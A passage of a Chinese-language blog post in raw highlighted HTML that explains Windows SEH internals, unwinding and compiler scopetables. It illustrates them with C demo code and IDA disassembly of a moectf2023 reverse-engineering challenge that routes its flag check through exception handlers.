class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>EXCEPTION_DISPOSITION<br>__cdecl _except_handler(<br>    <span class="hljs-keyword">struct</span> _EXCEPTION_RECORD* ExceptionRecord,<br>    <span class="hljs-type">void</span>* EstablisherFrame,<br>    <span class="hljs-keyword">struct</span> _CONTEXT* ContextRecord,<br>    <span class="hljs-type">void</span>* DispatcherContext)<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Home Grown handler: Exception Code: %08X Exception Flags %X&quot;</span>,<br>        ExceptionRecord-&gt;ExceptionCode, ExceptionRecord-&gt;ExceptionFlags);<br><br>    <span class="hljs-keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags &amp; <span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; EH_NONCONTINUABLE&quot;</span>);<br>    <span class="hljs-keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags &amp; <span class="hljs-number">2</span>)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; EH_UNWINDING&quot;</span>);<br>    <span class="hljs-keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags &amp; <span class="hljs-number">4</span>)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; EH_EXIT_UNWIND&quot;</span>);<br>    <span class="hljs-keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags &amp; <span class="hljs-number">8</span>) <span class="hljs-comment">// 注意这个标志</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; EH_STACK_INVALID&quot;</span>);<br>    <span class="hljs-keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags &amp; <span class="hljs-number">0x10</span>)   <span class="hljs-comment">// 注意这个标志</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; EH_NESTED_CALL&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-comment">// 我们不想处理这个异常，让其它函数处理吧</span><br>    <span class="hljs-keyword">return</span> ExceptionContinueSearch;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">HomeGrownFrame</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    DWORD handler = (DWORD)_except_handler;<br>    __asm<br>    &#123;<br>        <span class="hljs-comment">// 创建EXCEPTION_REGISTRATION结构：</span><br>        push handler       <span class="hljs-comment">// handler函数的地址</span><br>        push FS : [<span class="hljs-number">0</span>]        <span class="hljs-comment">// 前一个handler函数的地址</span><br>        mov FS : [<span class="hljs-number">0</span>] , ESP     <span class="hljs-comment">// 安装新的EXECEPTION_REGISTRATION结构</span><br>    &#125;<br><br>    *(PDWORD)<span class="hljs-number">0</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">// 写入地址0，从而引发一个错误</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;I should never get here!\n&quot;</span>);<br><br>    __asm<br>    &#123;<br>        <span class="hljs-comment">// 移去我们的EXECEPTION_REGISTRATION结构</span><br>        mov eax, [ESP]     <span class="hljs-comment">// 获取前一个结构</span><br>        mov FS : [<span class="hljs-number">0</span>] , EAX <span class="hljs-comment">// 安装前一个结构</span><br>        add esp, <span class="hljs-number">8</span>        <span class="hljs-comment">// 把我们EXECEPTION_REGISTRATION结构弹出堆栈</span><br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    __try<br>    &#123;<br>        HomeGrownFrame();<br>    &#125;<br>    __except (EXCEPTION_EXECUTE_HANDLER)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Caught the exception in main()\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>此demo主要流程就是在函数<code>HomeGrownFrame()</code>中安装一个SEH并且引发一个错误，但是我们并不处理这个错误，而是交给<code>main()</code>函数中的<code>__except</code>来处理。当尝试运行时，会发现如下的输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">Home Grown handler: Exception Code: C0000005 Exception Flags <span class="hljs-number">0</span><br>Home Grown handler: Exception Code: C0000027 Exception Flags <span class="hljs-number">2</span> EH_UNWINDING<br>Caught the Exception in <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure><p>应当令人惊讶的是，<code>_except_handler</code>函数似乎调用了两次，而且结果还不相同。</p><p>​比较一下以“Home Grown Handler”开头的两行，就会看出它们之间有明显的区别。第一次异常标志是0，而第二次是2。这把我们带入到了展开（Unwinding）的世界中。实际上，当一个异常处理回调函数拒绝处理某个异常时，它会被再一次调用。但是这次回调并不是立即发生的。这有点复杂。我需要把异常发生时的情形好好梳理一下。</p><p>​当异常发生的时候，操作系统会第一次遍历**_EXCEPTION_REGISTRATION_RECORD结构链表**，直到找到处理此异常的函数，然后第二次遍历此链表直到处理此异常的结点，在这两次调用中，操作系统都会调用里面的异常处理函数（由于异常处理函数通常会设置一些过滤操作，所以并不是每次都会执行真正的修复部分），唯一的区别就是第二次调用中异常标志被设置为2。这个值被定义为EH_UNWINDING。</p><p>​那为什么需要调用两次呢？实际上是操作系统给这个函数做最后的清理，一个绝好的例子是C++类的析构函数。当一个函数的异常处理程序拒绝处理某个异常时，通常执行流程并不会正常地从那个函数退出。现在，想像一个定义了 一个C++类的实例作为局部变量的函数。C++规范规定析构函数必须被调用。这带EH_UNWINDING标志的第二次回调就给这个函数一个机会去做一些类似于调用析构函数和__finally块之类的清理工作。</p><p>​粗暴地来说，展开就是二次执行异常处理函数，并做一些清理。</p><h2 id="编译器层面的SEH"><a href="#编译器层面的SEH" class="headerlink" title="编译器层面的SEH"></a>编译器层面的SEH</h2><p>​虽然使用几句简单的汇编也可以安装SEH结构，但是在使用上多少还是有不便，于是乎Visual为此进行了设置语法结构，即简单的<code>__try&#123;&#125; __except&#123;&#125;</code>结构，它的模式是这样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">__try &#123;<br>    <span class="hljs-comment">// 这里是被保护的代码</span><br>&#125;<br>__except (过滤器表达式) &#123; <br>   <span class="hljs-comment">// 这里是异常处理程序代码</span><br>&#125;<br></code></pre></td></tr></table></figure><p>​在汇编层面实际上与之前的是一样的，也就是在进入一个<code>__try</code>块之前一定会看到类似的语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">MOV DWORD PTR FS:[<span class="hljs-number">00000000</span>],ESP<br></code></pre></td></tr></table></figure><p>​也就是安装SEH到<code>fs:[0]</code>处，与之前的知识是一致的</p><p>​但实际上，Visual的<code>__try</code>结构是扩展了的，它往里面<code>_EXCEPTION_REGISTRATION_RECORD</code>结构添了点新东西。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION_RECORD</span>&#123;</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION</span> *<span class="hljs-title">prev</span>;</span><br>   <span class="hljs-type">void</span> (*handler)(    PEXCEPTION_RECORD,<br>                   PEXCEPTION_REGISTRATION,<br>                   PCONTEXT,<br>                  PEXCEPTION_RECORD);<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">scopetable_entry</span> *<span class="hljs-title">scopetable</span>;</span><br> <span class="hljs-type">int</span> trylevel;<br>&#125;;<br></code></pre></td></tr></table></figure><p>​此结构的第一个和第二成员与之前的是一样的，后面三个域：scopetable（作用域表）、trylevel和_ebp是新增加的。scopetable域指向一个scopetable_entry结构数组，而trylevel域实际上是这个数组的索引。最后一个域_ebp，是EXCEPTION_REGISTRATION结构创建之前栈帧指针（EBP）的值。</p><p>​还有一个结构与此相关，也是Visual真正使用的结构<code>CPPEH_RECORD</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CPPEH_RECORD</span>&#123;</span><br>    DWORD old_esp;<br>    EXCEPTION_POINTERS *exc_ptr;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION_RECORD</span> <span class="hljs-title">registration</span>;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>​此处的<code>old_esp</code>是真正开始执行正常函数操作时的esp</p><p>​同时保留一个DWORD来存储<code>EXCEPTION_POINTERS</code>结构，这个结构其实就是调用<strong>GetExceptionInformation</strong>所返回的指针，如下是此结构的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_POINTERS</span> &#123;</span><br>  PEXCEPTION_RECORD ExceptionRecord;<br>  PCONTEXT          ContextRecord;<br>&#125; EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;<br></code></pre></td></tr></table></figure><p>​说了这么多不如直接来看看Visual是怎么做的吧！</p><p>​下面给出源码和进入<code>__try</code>之前的反汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    __try<br>    &#123;<br>    <br>    &#125;<br>    __except (EXCEPTION_EXECUTE_HANDLER)<br>    &#123;<br>       <br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">push        ebp  <br>mov         ebp,esp  <br>push        <span class="hljs-number">0F</span>FFFFFFEh  <span class="hljs-comment">//压入TryLevel</span><br>push        <span class="hljs-number">539228</span>h  <span class="hljs-comment">//压入ScopTable</span><br>push        offset _except_handler4 (<span class="hljs-number">0533</span>DB0h)  <span class="hljs-comment">//压入_except_handler4</span><br>mov         eax,dword ptr fs:[<span class="hljs-number">00000000</span>h]  <br>push        eax  <span class="hljs-comment">//压入Next指针</span><br>    <br>    <span class="hljs-comment">//开辟新空间 做一些安全检查</span><br>add         esp,<span class="hljs-number">0F</span>FFFFF38h  <br>push        ebx  <br>push        esi  <br>push        edi  <br>lea         edi,[ebp<span class="hljs-number">-18</span>h]  <br>xor         ecx,ecx  <br>mov         eax,<span class="hljs-number">0</span>CCCCCCCCh  <br>rep stos    dword ptr es:[edi]  <br>mov         eax,dword ptr [__security_cookie (<span class="hljs-number">053</span>A004h)]  <br>xor         dword ptr [ebp<span class="hljs-number">-8</span>],eax  <br>xor         eax,ebp  <br>push        eax  <br>    <span class="hljs-comment">//安全检查结束</span><br>    <br>lea         eax,[ebp<span class="hljs-number">-10</span>h]  <br>mov         dword ptr fs:[<span class="hljs-number">00000000</span>h],eax  <span class="hljs-comment">//把上一个SEH地址给现在这个SEH结构</span><br>mov         dword ptr [ebp<span class="hljs-number">-18</span>h],esp  <span class="hljs-comment">//保存现在的ESP值</span><br>    <br>    <span class="hljs-comment">//一些安全检查</span><br>mov         ecx,offset _EF1F479B_SEH@cpp (<span class="hljs-number">053</span>C0A2h)  <br>call        @__CheckForDebuggerJustMyCode@<span class="hljs-number">4</span> (<span class="hljs-number">053132F</span>h)  <br></code></pre></td></tr></table></figure><p>​这里给出栈的分布图，就会更加明朗了</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202308221821893.jpg"></p><p>​现在安装SEH后的栈分布图知道了，就可以具体研究那些新增成员的含义了。</p><p>​如下是<code>_SCOPETABLE_ENTRY</code>结构定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SCOPETABLE_ENTRY</span>&#123;</span><br>    DWORD EnclosingLevel; <span class="hljs-comment">//上一层__try块</span><br>    PVOID FilterFunc; <span class="hljs-comment">//过滤表达式</span><br>    PVOID HandlerFunc; <span class="hljs-comment">//__except代码或__finally代码</span><br>&#125;<br></code></pre></td></tr></table></figure><p>​这里的<code>FilterFunc</code>就是<code>except</code>里面的过滤表达式，它在这里充当异常筛选的作用，可以完成任何想要完成的工作，只要最后反回的结果符号要求即可，其返回值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXCEPTION_EXECUTE_HANDLER 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXCEPTION_CONTINUE_SEARCH 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXCEPTION_CONTINUE_EXECUTION -1</span><br></code></pre></td></tr></table></figure><p>​<code>HandlerFunc</code>就是之前的异常处理函数了。</p><p>​那么编译器为什么要选择对结构进行扩展呢？其原因是编译器**并不会对每个<code>__try</code>块都生成一个<code>EXCEPTION_REGISTRATION_RECORD</code>结构，而是不管有多层嵌套调用的<code>__try</code>块都只生成一个<code>EXCEPTION_REGISTRATION_RECORD</code>结构并挂入线程的异常链表。对于那些不同<code>__except</code>块代码则用一个代理函数处理，这个代理函数就是扩展结构<code>_EXCEPTION_REGISTRATION_RECORD</code>的<code>_except_handler4</code>函数，而我们自己写的<code>__except</code>代码则被存储在<code>scopetable</code>数组中。</p><p>​换句话说，编译器将多层的<code>__try</code>块进行抽象，使用<code>_except_handler4</code>来处理所有的<code>__except</code>代码，在<code>scopetable</code>数组中存储了相应层级的<code>FilterFunc</code>、<code>HandlerFunc</code>，而扩展结构中的<code>TryLevel</code>就是这个数组的索引，<code>_except_handler4</code>就可以通过这些结构来调用相应的函数。</p><p>​</p><h2 id="再谈展开"><a href="#再谈展开" class="headerlink" title="再谈展开"></a>再谈展开</h2><p>​前面提及展开就是给函数第二次机会，让他清理一下自己的东西，并且把SEH的链表头设置为当前的SEH。这一部分是操作系统自动完成的，当然我们也可以手动进行展开操作，微软提供一个API<code>RtlUnwind</code>可以完成这个操作，这个函数声明如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">RtlUnwind(VirtualTargetFrame,TargetPC,ExceptionRecord,ReturnValue)<br></code></pre></td></tr></table></figure><p>参数说明：</p><blockquote><p>VirtualTargetFrame：展开时最后SEH停止与回调函数对应的EXCEPTION_REGISTRATION_RECORD指针，即希望在哪个回调函数前展开调用停止</p><p>TargetPC：调用RtlUnwind返回后应执行指令的地址，如果0，则自然返回RtlUnwind调用后下一条指令</p><p>ExceptionRecord：当前异常EXCEPTION_RECORD结构</p><p>ReturnValue：返回值，通常不使用</p></blockquote><p>​实际上大多时候并不需要自己手动调用，微软也并没有十分公开此API，由操作系统自动调用即可。</p><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>以今年moectf为例来解说一下吧</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main_0</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [esp+0h] [ebp-100h]</span><br><br>  __CheckForDebuggerJustMyCode(&amp;unk_5EC063);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to moectf2023!!! Now you find YunZh1Jun&#x27;s revenge!!!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Do you know TEA(an encryption algorithm)? Do you know unwind in SEH? &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I believe you can understand them! So let me check your flag~&quot;</span>);<br>  sub_5E10CD(<span class="hljs-string">&quot;Input:&quot;</span>, v4);<br>  sub_5E13CA(<span class="hljs-string">&quot;%64s&quot;</span>, (<span class="hljs-type">char</span>)&amp;flag);<br>  MEMORY[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  sub_5E10FF();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Right flag! Have fun in moectf2023~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​这是主函数的反汇编，如果使用IDA打开会发现大红大红的<code>MEMORY[0] = 0</code>，实际上就是故意引发错误来使用SEH，IDA并不会把<code>__except</code>内容给反汇编出来，所以必须看汇编代码，如下是相关的汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">005E5908</span> ;   __try &#123; <span class="hljs-comment">// __except at loc_5E5928</span><br>.text:<span class="hljs-number">005E5908</span> mov     [ebp+ms_exc.registration.TryLevel], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">005E590</span>F mov     large dword ptr ds:<span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">005E590</span>F ;   &#125; <span class="hljs-comment">// starts at 5E5908</span><br>.text:<span class="hljs-number">005E5919</span> mov     [ebp+ms_exc.registration.TryLevel], <span class="hljs-number">0F</span>FFFFFFEh<br>.text:<span class="hljs-number">005E5920</span> jmp     <span class="hljs-type">short</span> loc_5E597A<br>    <br>.text:<span class="hljs-number">005E5928</span> loc_5E5928:<br>.text:<span class="hljs-number">005E5928</span> ;   __except(loc_5E5922) <span class="hljs-comment">// owned by 5E5908</span><br>.text:<span class="hljs-number">005E5928</span> mov     esp, [ebp+ms_exc.old_esp]<br>.text:<span class="hljs-number">005E592</span>B push    offset aDx3906  ; <span class="hljs-string">&quot;DX3906&quot;</span><br>.text:<span class="hljs-number">005E5930</span> push    offset flag<br>.text:<span class="hljs-number">005E5935</span> call    enc<br>.text:<span class="hljs-number">005E593</span>A add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E593</span>D push    offset aDoctor3 ; <span class="hljs-string">&quot;doctor3&quot;</span><br>.text:<span class="hljs-number">005E5942</span> push    offset dword_5EA580<br>.text:<span class="hljs-number">005E5947</span> call    enc<br>.text:<span class="hljs-number">005E594</span>C add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E594</span>F push    offset aFux1aoyun ; <span class="hljs-string">&quot;FUX1AOYUN&quot;</span><br>.text:<span class="hljs-number">005E5954</span> push    offset unk_5EA588<br>.text:<span class="hljs-number">005E5959</span> call    enc<br>.text:<span class="hljs-number">005E595</span>E add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E5961</span> push    offset aR3verier ; <span class="hljs-string">&quot;R3verier&quot;</span><br>.text:<span class="hljs-number">005E5966</span> push    offset dword_5EA590<br>.text:<span class="hljs-number">005E596</span>B call    enc<br>.text:<span class="hljs-number">005E5970</span> add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E5973</span> mov     [ebp+ms_exc.registration.TryLevel], <span class="hljs-number">0F</span>FFFFFFEh<br></code></pre></td></tr></table></figure><p>​其中<code>//</code>所注释的语句都是IDA自动识别添加的，可以通过这几个注释语句很明显的看到<code>__try&#123;&#125; __except&#123;&#125;</code>结构，而<code>__except</code>括号中的代码就应该是异常筛选函数了，这题没有使用异常筛选函数，均是直接处理异常。</p><p>​所以<code>loc_5E5928</code>处代码就是相关的异常处理函数了，此异常的主要代码就在这里面，所使用的加密算法就是普通的TEA，这不是本文主要分析内容且相关加解密也很简单就不再赘述。</p><p>​继续往下看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">loc_5E597A:<br>.text:<span class="hljs-number">005E597</span>A ;   __try &#123; <span class="hljs-comment">// __except at loc_5E5995</span><br>.text:<span class="hljs-number">005E597</span>A mov     [ebp+ms_exc.registration.TryLevel], <span class="hljs-number">1</span><br>.text:<span class="hljs-number">005E5981</span> call    sub_5E10FF<br>.text:<span class="hljs-number">005E5981</span> ;   &#125; <span class="hljs-comment">// starts at 5E597A</span><br>.text:<span class="hljs-number">005E5986</span> mov     [ebp+ms_exc.registration.TryLevel], <span class="hljs-number">0F</span>FFFFFFEh<br>.text:<span class="hljs-number">005E598</span>D jmp     <span class="hljs-type">short</span> loc_5E5A01<br>    <br>loc_5E5995:<br>.text:<span class="hljs-number">005E5995</span> ;   __except(loc_5E598F) <span class="hljs-comment">// owned by 5E597A</span><br>.text:<span class="hljs-number">005E5995</span> mov     esp, [ebp+ms_exc.old_esp]<br>.text:<span class="hljs-number">005E5998</span> mov     [ebp+var_20], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">005E599</span>F jmp     <span class="hljs-type">short</span> loc_5E59AA<br></code></pre></td></tr></table></figure><p>​显然此时的关键函数是<code>__try</code>块里的<code>sub_5E10FF</code>，跟进去查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">005E1820</span> var_E4= dword ptr <span class="hljs-number">-0E4</span>h<br>.text:<span class="hljs-number">005E1820</span> var_10= byte ptr <span class="hljs-number">-10</span>h<br>.text:<span class="hljs-number">005E1820</span> var_C= dword ptr <span class="hljs-number">-0</span>Ch<br>.text:<span class="hljs-number">005E1820</span> var_4= dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">005E1820</span><br>.text:<span class="hljs-number">005E1820</span> push    ebp<br>.text:<span class="hljs-number">005E1821</span> mov     ebp, esp<br>.text:<span class="hljs-number">005E1823</span> sub     esp, <span class="hljs-number">0</span>D0h<br>.text:<span class="hljs-number">005E1829</span> push    ebx<br>.text:<span class="hljs-number">005E182</span>A push    esi<br>.text:<span class="hljs-number">005E182</span>B push    edi<br>.text:<span class="hljs-number">005E182</span>C lea     edi, [ebp+var_10]<br>.text:<span class="hljs-number">005E182</span>F mov     ecx, <span class="hljs-number">4</span><br>.text:<span class="hljs-number">005E1834</span> mov     eax, <span class="hljs-number">0</span>CCCCCCCCh<br>.text:<span class="hljs-number">005E1839</span> rep stosd<br>.text:<span class="hljs-number">005E183</span>B mov     eax, ___security_cookie<br>.text:<span class="hljs-number">005E1840</span> xor     eax, ebp<br>.text:<span class="hljs-number">005E1842</span> mov     [ebp+var_4], eax<br>.text:<span class="hljs-number">005E1845</span> mov     [ebp+var_C], offset sub_5E12FD<br>.text:<span class="hljs-number">005E184</span>C push    [ebp+var_C]<br>.text:<span class="hljs-number">005E184</span>F push    large dword ptr fs:<span class="hljs-number">0</span><br>.text:<span class="hljs-number">005E1856</span> mov     large fs:<span class="hljs-number">0</span>, esp<br>.text:<span class="hljs-number">005E185</span>D <span class="hljs-type">int</span>     <span class="hljs-number">3</span>               ; Trap to Debugger<br>.text:<span class="hljs-number">005E185</span>E mov     eax, [esp+<span class="hljs-number">0E4</span>h+var_E4]<br>.text:<span class="hljs-number">005E1861</span> mov     large fs:<span class="hljs-number">0</span>, eax<br>.text:<span class="hljs-number">005E1867</span> add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E186</span>A pop     edi<br>.text:<span class="hljs-number">005E186</span>B pop     esi<br>.text:<span class="hljs-number">005E186</span>C pop     ebx<br>.text:<span class="hljs-number">005E186</span>D mov     ecx, [ebp+var_4]<br>.text:<span class="hljs-number">005E1870</span> xor     ecx, ebp        ; StackCookie<br>.text:<span class="hljs-number">005E1872</span> call    j_@__security_check_cookie@<span class="hljs-number">4</span> ; __security_check_cookie(x)<br>.text:<span class="hljs-number">005E1877</span> add     esp, <span class="hljs-number">0</span>D0h<br>.text:<span class="hljs-number">005E187</span>D cmp     ebp, esp<br>.text:<span class="hljs-number">005E187</span>F call    j___RTC_CheckEsp<br>.text:<span class="hljs-number">005E1884</span> mov     esp, ebp<br>.text:<span class="hljs-number">005E1886</span> pop     ebp<br>.text:<span class="hljs-number">005E1887</span> retn<br></code></pre></td></tr></table></figure><p>​让我们把目光集中到地址5E1845处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">005E1845</span> mov     [ebp+var_C], offset sub_5E12FD<br>.text:<span class="hljs-number">005E184</span>C push    [ebp+var_C]<br>.text:<span class="hljs-number">005E184</span>F push    large dword ptr fs:<span class="hljs-number">0</span><br>.text:<span class="hljs-number">005E1856</span> mov     large fs:<span class="hljs-number">0</span>, esp<br>.text:<span class="hljs-number">005E185</span>D <span class="hljs-type">int</span>     <span class="hljs-number">3</span>               ; Trap to 